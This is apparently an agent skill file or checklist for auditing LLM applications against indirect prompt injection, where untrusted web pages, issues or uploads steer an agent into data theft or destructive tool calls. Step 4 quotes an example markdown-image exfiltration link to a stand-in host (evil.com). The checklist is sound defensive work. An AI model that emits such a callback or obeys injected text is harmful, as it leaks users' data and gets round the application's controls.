---
action: AUDIT
phase: 04-before-production
summary: Audit application for indirect prompt injection vulnerabilities in untrusted external text.
modifies_code: false
aliases:
  - prompt-injection-review
  - llm-security-audit
---

# Agent & Prompt Injection Security Review

## Goal

Detect and prevent indirect prompt injection, data exfiltration, and unauthorized tool invocation caused by untrusted external text.

## Use when

- The application uses LLMs, agentic tool callers, or automated AI assistants processing user or web content.
- External inputs (markdown files, issues, scraped web pages, user bios) are passed into AI prompts.

## Steps

1. **Map External Data Boundaries**: Identify all user-generated strings, fetched URLs, and document uploads fed into model prompts.
2. **Review System Isolation**: Ensure system instructions and user content are separated into distinct message roles rather than concatenated into a single string.
3. **Audit Tool Permissions**: Check whether tools invoked by LLMs have destructive filesystem or database write capabilities without human confirmation.
4. **Inspect Exfiltration Vectors**: Ensure rendered model outputs do not allow markdown image or iframe callbacks (`![leak](https://evil.com?data=...)`).

## Limits

- Do not disable necessary AI functionality; enforce structured boundary isolation instead.
- Do not run untrusted payloads against production endpoints.

## Output

A risk matrix:
- **Injection Surface**: Identified untrusted input points.
- **Severity**: Critical, High, or Medium.
- **Recommended Mitigations**: Strict delimiters, role separation, or tool confirmation gates.
